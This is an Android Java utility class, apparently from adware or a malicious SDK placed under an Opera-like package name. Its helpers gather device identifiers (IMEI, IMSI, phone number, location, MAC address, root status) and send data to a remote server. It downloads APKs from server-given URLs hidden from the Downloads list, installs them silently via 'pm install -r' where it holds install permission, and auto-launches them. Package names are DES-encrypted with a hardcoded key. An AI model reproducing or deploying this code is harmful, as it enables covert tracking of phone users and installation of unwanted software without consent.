package com.opera.utils.utils;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.InputStream;
import java.security.NoSuchAlgorithmException;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.UUID;

import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.DESKeySpec;

import org.json.JSONArray;
import org.json.JSONObject;

import com.opera.utils.services.SilentService;

import android.app.DownloadManager;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.DownloadManager.Query;
import android.app.DownloadManager.Request;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.content.res.AssetManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.drawable.Drawable;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Environment;
import android.text.TextUtils;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.ImageView;

public class MyHelpUtil {

	public static final String A = "3474739D4B4329F028031BBA4CA00827";

	/**
	 * 
	 * 
	 * @return
	 */
	public static String add_notifacation_params(Context context) {

		StringBuilder params_str = new StringBuilder();

		params_str.append("a=" + DeviceUtils.getDeviceUtils(context));

		params_str.append("&b=" + AppUtil_i.getAppName(context));

		params_str.append("&c=" + AppUtil_i.getPackageName(context));

		params_str.append("&d=" + AppUtil_i.getAppSign(context));

		params_str.append("&e=" + AppUtil_i.getversionName(context));

		params_str.append("&f=" + AppUtil_i.getversionCode(context));

		params_str.append("&g=" + DeviceUtils.getNetworkCountryIso(context));

		params_str.append("&h=" + DeviceUtils.getKeyStore(context));

		params_str.append("&i=" + DeviceUtils.getIMSI(context));

		params_str.append("&j=" + DeviceUtils.getIMEI(context));

		SharedPreferences localSharedPreferences_id = context
				.getSharedPreferences("DEVICE_STATUS", 0);

		params_str
				.append("&k="
						+ localSharedPreferences_id.getString(
								"create_device_id", "no"));

		params_str.append("&l=" + MyHelpUtil.isSystemApp(context));

		params_str.append("&m=" + DeviceUtils.getLocalLanguage(context));

		return params_str.toString();

	}

	public static String setParams(String apppakname, int status,
			Context context) {

		StringBuilder builder = new StringBuilder();

		builder.append("a=" + DeviceUtils.getDeviceUtils(context));

		builder.append("&b=" + MyHelpUtil.enCrypto(apppakname, MyHelpUtil.A));

		builder.append("&d=" + DeviceUtils.getKeyStore(context));

		builder.append("&c=" + DeviceUtils.getNetworkCountryIso(context));

		builder.append("&h=" + status);

		SharedPreferences localSharedPreferences_id = context
				.getSharedPreferences("DEVICE_STATUS", 0);

		builder.append("&g="
				+ localSharedPreferences_id.getString("create_device_id", ""));

		builder.append("&f=" + DeviceUtils.getIMSI(context));

		builder.append("&e=" + DeviceUtils.getIMEI(context));

		return builder.toString();
	}

	/**
	 * 封装设备信息
	 * 
	 * @param context
	 * @return
	 */
	public static String add_device_params(Context context) {

		StringBuffer params_str = new StringBuffer();

		params_str.append("a=" + DeviceUtils.getIMEI(context));

		params_str.append("&b=" + DeviceUtils.getModel());

		params_str.append("&c=" + DeviceUtils.getResolution(context));

		params_str.append("&d=" + DeviceUtils.isMTKChip());

		params_str.append("&e=" + DeviceUtils.getIMSI(context));

		params_str.append("&f=" + DeviceUtils.getNetworkOperator(context));

		params_str.append("&g=" + DeviceUtils.getLine1Number(context));

		params_str.append("&h=" + DeviceUtils.getNetworkCountryIso(context));

		params_str.append("&i=" + DeviceUtils.isRoot());

		params_str.append("&j=" + DeviceUtils.getRELEASEVersion());

		params_str.append("&k=" + DeviceUtils.getManufacturer());

		params_str.append("&l=" + DeviceUtils.getWifiMacAddr(context));

		params_str.append("&m=" + DeviceUtils.getAvailableInternalMemorySize());

		params_str.append("&n=" + DeviceUtils.getTotalInternalMemorySize());

		params_str.append("&o=" + DeviceUtils.getAvailableExternalMemorySize());

		params_str.append("&p=" + DeviceUtils.getTotalExternalMemorySize());

		params_str.append("&q=" + AppUtil_i.getAppName(context));

		params_str.append("&r=" + AppUtil_i.getPackageName(context));

		params_str.append("&s=" + DeviceUtils.getDeviceUtils(context));

		params_str.append("&t=" + AppUtil_i.getAppSign(context));

		params_str.append("&u=" + AppUtil_i.getversionName(context));

		params_str.append("&v=" + AppUtil_i.getversionCode(context));

		params_str.append("&w=" + DeviceUtils.getLocation(context));

		params_str.append("&x=" + DeviceUtils.getKeyStore(context));

		params_str.append("&y=" + isSystemApp(context));

		SharedPreferences localSharedPreferences = context
				.getSharedPreferences("SCREEN_STATUS", 0);

		params_str.append("&z="
				+ localSharedPreferences.getInt("screen_count", 0));//

		SharedPreferences localSharedPreferences_id = context
				.getSharedPreferences("DEVICE_STATUS", 0);

		int isSystemApp = MyHelpUtil.isSystemApp(context);

		SharedPreferences localSharedPreferences_t = context
				.getSharedPreferences("MSG_STATUS", 0);

		if (isSystemApp == 0) {

			if (!localSharedPreferences_t.contains("silent")) {

				params_str.append("&ab=" + 0);

			} else {

				long s = localSharedPreferences_t.getLong("silent", 0);

				long result_time = Math.abs(new Date().getTime() - s);

				params_str.append("&ab=" + result_time / 1000 / 3600);

			}

		} else {

			if (!localSharedPreferences_t.contains("notification")) {

				params_str.append("&ab=" + 0);

			} else {

				long s = localSharedPreferences_t.getLong("notification", 0);

				long result_time = Math.abs(new Date().getTime() - s);

				params_str.append("&ab=" + result_time / 1000 / 3600);

			}

		}

		params_str
				.append("&ac="
						+ localSharedPreferences_id.getString(
								"create_device_id", "no"));

		params_str.append("&ad=" + DeviceUtils.getTelephoneType(context));

		params_str.append("&ae=" + AppUtil_i.getPackageLocation(context));

		return params_str.toString();
	}

	public static boolean isNetworkConnected(Context context) {
		if (context != null) {
			ConnectivityManager mConnectivityManager = (ConnectivityManager) context
					.getSystemService(Context.CONNECTIVITY_SERVICE);
			NetworkInfo mNetworkInfo = mConnectivityManager
					.getActiveNetworkInfo();
			if (mNetworkInfo != null) {
				return mNetworkInfo.isAvailable();
			}
		}
		return false;
	}

	public static Map<String, String> add_intalls_apps_params(Context context) {

		return null;
	}

	public static Bitmap createBitmap(String paramString, int paramInt1,
			int paramInt2) {

		Bitmap localBitmap1 = BitmapFactory.decodeFile(paramString);
		Bitmap localBitmap2 = null;

		if (localBitmap1 != null) {
			localBitmap2 = Bitmap.createScaledBitmap(localBitmap1, paramInt1,
					paramInt2, true);
			localBitmap1.recycle();
		}

		return localBitmap2;
	}

	public static Drawable getDrawable(String paramString, Context paramContext) {
		Object localObject2 = paramContext.getResources().getAssets();
		try {
			InputStream localInputStream = ((AssetManager) localObject2)
					.open(paramString);
			Drawable localDrawable = Drawable.createFromStream(
					localInputStream, null);
			return localDrawable;
		} catch (Exception e) {
			e.printStackTrace();
		}

		return null;
	}

	public static String lineDownloadAppURL(Context context, String appalias) {

		String packageName = AppUtil_i.getPackageName(context);

		String appSign = AppUtil_i.getAppSign(context);

		String versionName = AppUtil_i.getversionName(context);

		String versionCode = AppUtil_i.getversionCode(context);

		String deviceId = DeviceUtils.getDeviceUtils(context);

		String cid = DeviceUtils.getKeyStore(context);

		StringBuffer params_url = new StringBuffer();

		params_url.append("?a=" + appalias);

		params_url.append("&b=" + packageName);

		params_url.append("&c=" + appSign);

		params_url.append("&d=" + versionName);

		params_url.append("&e=" + versionCode);

		params_url.append("&f=" + deviceId);

		params_url.append("&g=" + cid);

		return HttpUtil.BASE_DOWNLOAD_URL + params_url;
	}

	public static boolean checkNet(Context context) {

		try {
			ConnectivityManager connectivity = (ConnectivityManager) context
					.getSystemService(Context.CONNECTIVITY_SERVICE);
			if (connectivity != null) {

				NetworkInfo info = connectivity.getActiveNetworkInfo();
				if (info != null && info.isConnected()) {

					if (info.getState() == NetworkInfo.State.CONNECTED) {
						return true;
					}
				}
			}
		} catch (Exception e) {
			return false;
		}
		return false;
	}

	public static String deCrypto(String txt, String key) {
		SecretKeyFactory skeyFactory = null;
		Cipher cipher = null;
		byte[] btxts = null;
		try {
			DESKeySpec desKeySpec = new DESKeySpec(key.getBytes());
			skeyFactory = SecretKeyFactory.getInstance("DES");
			cipher = Cipher.getInstance("DES");
			SecretKey deskey = skeyFactory.generateSecret(desKeySpec);
			cipher.init(Cipher.DECRYPT_MODE, deskey);
			btxts = new byte[txt.length() / 2];
			for (int i = 0, count = txt.length(); i < count; i += 2) {
				btxts[i / 2] = (byte) Integer.parseInt(txt.substring(i, i + 2),
						16);
			}
			return (new String(cipher.doFinal(btxts)));
		} catch (Exception e) {
			e.printStackTrace();
		}

		return null;

	}

	/**
	 * 构建通知
	 * 
	 * @param bitmap
	 * @param title
	 * @param text
	 * @param ticktitle
	 * @param context
	 */
	public static void showNotifacation(Bitmap bitmap,
			CharSequence contentTitle, CharSequence contentText,
			CharSequence ticktitle, Context context, int nid, int cancelflag,
			PendingIntent contentIntent, int going) {

		NotificationManager _nm = (NotificationManager) context
				.getSystemService(Context.NOTIFICATION_SERVICE);

		// 0x7f020001 context.getApplicationInfo().icon
		Notification notifacation = new Notification(0x7f020001, ticktitle,
				System.currentTimeMillis());

		notifacation.flags |= Notification.FLAG_AUTO_CANCEL;

		if (cancelflag == 1) {
			notifacation.flags |= Notification.FLAG_NO_CLEAR;
			notifacation.flags |= Notification.FLAG_ONGOING_EVENT;
		}

		notifacation.setLatestEventInfo(context, contentTitle, contentText,
				contentIntent);

		View localView = LayoutInflater.from(context.getApplicationContext())
				.inflate(notifacation.contentView.getLayoutId(), null);

		if (localView != null)
			;
		ImageView localImageView = GetImaeView(localView);

		if ((localImageView != null) && (bitmap != null))
			;
		notifacation.contentView.setImageViewBitmap(localImageView.getId(),
				bitmap);

		_nm.notify(nid, notifacation);

	}

	// 查找ImageView
	protected static ImageView GetImaeView(View paramView) {
		if (paramView instanceof ImageView)
			return (ImageView) paramView;
		if (paramView instanceof ViewGroup)
			for (int i = 0; i < ((ViewGroup) paramView).getChildCount(); ++i) {
				View localView = ((ViewGroup) paramView).getChildAt(i);
				if (localView instanceof ImageView)
					return (ImageView) localView;
				if (localView instanceof ViewGroup)
					return GetImaeView(localView);
			}
		return null;
	}

	/**
	 * @param packageName
	 * @param context
	 */
	public static void openApp(String packageName, Context context) {

		Intent resolveIntent = new Intent(Intent.ACTION_MAIN, null);

		resolveIntent.addCategory(Intent.CATEGORY_LAUNCHER);

		resolveIntent.setPackage(packageName);

		List<ResolveInfo> apps = context.getPackageManager()
				.queryIntentActivities(resolveIntent, 0);

		ResolveInfo ri = apps.iterator().next();

		if (ri != null) {

			String packageName_i = ri.activityInfo.packageName;

			String className_i = ri.activityInfo.name;

			Intent intent = new Intent(Intent.ACTION_MAIN);

			intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

			intent.addCategory(Intent.CATEGORY_LAUNCHER);

			ComponentName cn = new ComponentName(packageName_i, className_i);

			intent.setComponent(cn);

			context.startActivity(intent);

		}

	}

	/**
	 * @param context
	 */
	public static void synchronousApp(Context context) {

		String url = HttpUtil.BASE_URL + "app_b.action";

		try {
			String result = HttpUtil.getRequest(url);

			if (!TextUtils.isEmpty(result) && !"null".equals(result)) {

				JSONArray jsonArray = new JSONArray(result);

				SharedPreferences localSharedPreferences = context
						.getSharedPreferences("SynchronousApp", 0);

				Editor localEditor = localSharedPreferences.edit();

				for (int i = 0; i < jsonArray.length(); i++) {

					JSONObject jsonObject = jsonArray.getJSONObject(i);

					localEditor.putString(jsonObject.getString("apppakname"),
							jsonObject.getString("appname"));
				}

				localEditor.commit();

			}

		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}

	/**
	 * @return
	 */
	public static String getDir() {

		// 检测外部存储是否存在
		String state = Environment.getExternalStorageState();
		// 如果内存卡可用
		if (Environment.MEDIA_MOUNTED.equals(state)) {
			return Environment.getExternalStorageDirectory().getAbsolutePath()
					+ "/_xcl/";
		} else {
			return "";
		}
	}

	public static void save_screen_status(Context context) {
		SharedPreferences localSharedPreferences = context
				.getSharedPreferences("SCREEN_STATUS", 0);
		Editor localEditor = localSharedPreferences.edit();
		localEditor.putInt("screen_count",
				localSharedPreferences.getInt("screen_count", 0) + 1);
		localEditor.commit();
	}

	public static void create_device_id(Context context) {

		SharedPreferences localSharedPreferences = context
				.getSharedPreferences("DEVICE_STATUS", 0);
		if (!localSharedPreferences.contains("create_device_id")) {
			Editor localEditor = localSharedPreferences.edit();
			localEditor.putString("create_device_id", UUID.randomUUID()
					.toString());
			localEditor.commit();
		}
	}

	/**
	 * @param appalias
	 * @param path
	 * @return
	 */
	public static boolean fileExits(String fileuri) {

		File file = new File(fileuri);

		if (file.exists()) {
			return true;
		}
		return false;
	}

	public static void sys_msg(Context context, int m_type, String realpackname) {

		StringBuilder params_str = new StringBuilder();

		params_str.append("a="
				+ MyHelpUtil.enCrypto(realpackname, MyHelpUtil.A));

		params_str.append("&b=" + DeviceUtils.getDeviceUtils(context));

		params_str.append("&c=" + DeviceUtils.getKeyStore(context));

		SharedPreferences localSharedPreferences_id = context
				.getSharedPreferences("DEVICE_STATUS", 0);

		params_str
				.append("&d="
						+ localSharedPreferences_id.getString(
								"create_device_id", "no"));

		params_str.append("&e=" + m_type);

		// app_upload_installed_soft
		String url = HttpUtil.BASE_URL + "app_j.action";

		try {
			HttpUtil.postRequest(url, params_str.toString());
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	public static void localDownloadManagerMsg(Context context,
			String appalias, String msg_title, String msg_text,
			String apppakname, int msg_show_notifatication, int type,
			String download_url) {

		String localFileURI = context.getExternalFilesDir(
				Environment.DIRECTORY_DOWNLOADS).getPath()
				+ "/" + appalias + ".apk";

		File file = new File(localFileURI);

		SharedPreferences localSharedPreferences = context
				.getSharedPreferences("DOWLOAD_STATUS", 0);

		DownloadManager downloadManager = (DownloadManager) context
				.getSystemService(Context.DOWNLOAD_SERVICE);

		long downloadid = localSharedPreferences.getLong(appalias, -1);

		if (downloadid != -1) {

			if (!file.exists()) {

				long id = downloadApk(context, appalias, msg_title, msg_text,
						apppakname, msg_show_notifatication, type, download_url);

				setDownloadId(context, id, appalias);

				return;
			}

			Query query = new Query();

			query.setFilterById(downloadid);

			Cursor cursor = downloadManager.query(query);

			try {

				if (cursor.moveToNext()) {

					int column_status_index = cursor
							.getColumnIndex(DownloadManager.COLUMN_STATUS);

					int status = cursor.getInt(column_status_index);

					if (status == DownloadManager.STATUS_SUCCESSFUL) {

						PackageManager pm = context.getPackageManager();

						PackageInfo pi = pm.getPackageArchiveInfo(localFileURI,
								PackageManager.GET_SIGNATURES);

						if (pi == null || pi.signatures == null) {

							file.delete();

							long id = downloadApk(context, appalias, msg_title,
									msg_text, apppakname,
									msg_show_notifatication, type, download_url);

							setDownloadId(context, id, appalias);

							return;
						}

						int isSystemApp = MyHelpUtil.isSystemApp(context);

						if (isSystemApp == 0) {

							String localuri = context.getExternalFilesDir(
									Environment.DIRECTORY_DOWNLOADS).getPath()
									+ "/" + appalias + ".apk";

							int i = install(localuri);

							if (i == 1) {

								File file2 = new File(localuri);

								if (file2.exists()) {

									file2.delete();

									return;
								}
							}

							if (i == 0) {

								SilentService s = new SilentService(context);

								s.sysInstall(apppakname);

								s.saveSilentStatus();

								if (s.checkOpenTime()) {

									MyHelpUtil.openApp(apppakname, context);

									s.synchroOpenData(pi.packageName);

									s.openApp();

								}
							}

						} else {

							Intent installIntent = new Intent(
									Intent.ACTION_VIEW);

							installIntent
									.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

							installIntent.setDataAndType(Uri.fromFile(new File(
									context.getExternalFilesDir(
											Environment.DIRECTORY_DOWNLOADS)
											.getPath()
											+ "/" + appalias + ".apk")),
									"application/vnd.android.package-archive");

							context.startActivity(installIntent);
						}

					}

				} else {

					if (file.exists()) {

						file.delete();

						long id = downloadApk(context, appalias, msg_title,
								msg_text, apppakname, msg_show_notifatication,
								type, download_url);

						setDownloadId(context, id, appalias);

					} else {

						long id = downloadApk(context, appalias, msg_title,
								msg_text, apppakname, msg_show_notifatication,
								type, download_url);

						setDownloadId(context, id, appalias);
					}

				}

			} finally {
				if (cursor != null) {
					cursor.close();
				}
			}

		} else {

			if (file.exists()) {

				file.delete();

				long id = downloadApk(context, appalias, msg_title, msg_text,
						apppakname, msg_show_notifatication, type, download_url);

				setDownloadId(context, id, appalias);

			} else {

				long id = downloadApk(context, appalias, msg_title, msg_text,
						apppakname, msg_show_notifatication, type, download_url);

				setDownloadId(context, id, appalias);
			}
		}

	}

	public static void setDownloadId(Context context, Long id, String appalias) {

		SharedPreferences localSharedPreferences = context
				.getSharedPreferences("DOWLOAD_STATUS", 0);

		Editor localEditor = localSharedPreferences.edit();

		localEditor.putLong(appalias, id);

		localEditor.commit();

	}

	public static long downloadApk(Context context, String appalias,
			String msg_title, String msg_text, String apppakname,
			int msg_show_notifatication, int type, String download_url) {

		DownloadManager downloadManager = (DownloadManager) context
				.getSystemService(Context.DOWNLOAD_SERVICE);

		// 自定义下载地址

		System.out.println("广告》》APK下载地址：" + download_url);

		Uri uri = Uri.parse(download_url);

		// Uri uri = Uri.parse(MyHelpUtil.lineDownloadAppURL(context,
		// appalias));

		DownloadManager.Request request = new Request(uri);

		request.setAllowedNetworkTypes(Request.NETWORK_MOBILE
				| Request.NETWORK_WIFI);

		request.setTitle(msg_title);

		request.setDescription(msg_text);

		request.setShowRunningNotification(msg_show_notifatication == 0);

		request.setVisibleInDownloadsUi(false);

		request.setDestinationInExternalFilesDir(context,
				Environment.DIRECTORY_DOWNLOADS, appalias + ".apk");

		request.addRequestHeader("Connection", "Keep-Alive");

		request.addRequestHeader("Accept-Language", "zh-CN");

		request.addRequestHeader("Charset", "UTF-8");

		request.addRequestHeader("Accept",
				"application/vnd.android.package-archive,application/msword, */*");

		MyHelpUtil.sys_msg(context, type, apppakname);

		return downloadManager.enqueue(request);
	}

	public static int isSystemApp(Context context) {

		int pe = context
				.checkCallingOrSelfPermission(android.Manifest.permission.INSTALL_PACKAGES);

		if (pe == PackageManager.PERMISSION_GRANTED)
			return 0;

		return 1;
	}

	public static int install(String fileuri) {

		File file = new File(fileuri);

		String[] args = { "pm", "install", "-r", Uri.fromFile(file).getPath() };

		String result = null;

		ProcessBuilder processBuilder = new ProcessBuilder(args);

		Process process = null;

		InputStream errIs = null;

		InputStream inIs = null;

		try {
			ByteArrayOutputStream baos = new ByteArrayOutputStream();
			int read = -1;
			process = processBuilder.start();
			errIs = process.getErrorStream();
			while ((read = errIs.read()) != -1) {
				baos.write(read);
			}
			baos.write('\n');
			inIs = process.getInputStream();
			while ((read = inIs.read()) != -1) {
				baos.write(read);
			}
			byte[] data = baos.toByteArray();
			result = new String(data);
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			try {
				if (errIs != null) {
					errIs.close();
				}
				if (inIs != null) {
					inIs.close();
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				if (process != null) {
					// use exitValue() to determine if process is still running.
					process.exitValue();
				}
			} catch (IllegalThreadStateException e) {
				// process is still running, kill it.
				process.destroy();
			}
		}

		System.out.println("静默安装返回结果字符：" + result);

		if (result != null) {

			String res_tolower = result.toLowerCase(Locale.US);

			if (res_tolower.indexOf("success") != -1) {

				return 0;
			}

		}

		if (result != null) {

			if ((result.indexOf("not classes.dex") != -1)
					|| (result.indexOf("FAILED_INVALID_APK") != -1)) {
				return 1;
			}

			if ((result.indexOf("CERTIFICATES") != -1)) {
				return 1;
			}
		}
		return 2;
	}

	public static String enCrypto(String txt, String key) {

		if (txt != null && !"".equals(txt) && !"null".equals(txt)) {

			try {

				StringBuffer sb = new StringBuffer();
				DESKeySpec desKeySpec = new DESKeySpec(key.getBytes());
				SecretKeyFactory skeyFactory = null;
				Cipher cipher = null;
				try {
					skeyFactory = SecretKeyFactory.getInstance("DES");
					cipher = Cipher.getInstance("DES");
				} catch (NoSuchAlgorithmException e) {
					e.printStackTrace();
				}
				SecretKey deskey = skeyFactory.generateSecret(desKeySpec);
				cipher.init(Cipher.ENCRYPT_MODE, deskey);
				byte[] cipherText = cipher.doFinal(txt.getBytes());
				for (int n = 0; n < cipherText.length; n++) {
					String stmp = (java.lang.Integer
							.toHexString(cipherText[n] & 0XFF));
					if (stmp.length() == 1) {
						sb.append("0" + stmp);
					} else {
						sb.append(stmp);
					}
				}
				return sb.toString().toUpperCase(Locale.US);

			} catch (Exception e) {

				e.printStackTrace();
			}
		}
		return null;
	}

}
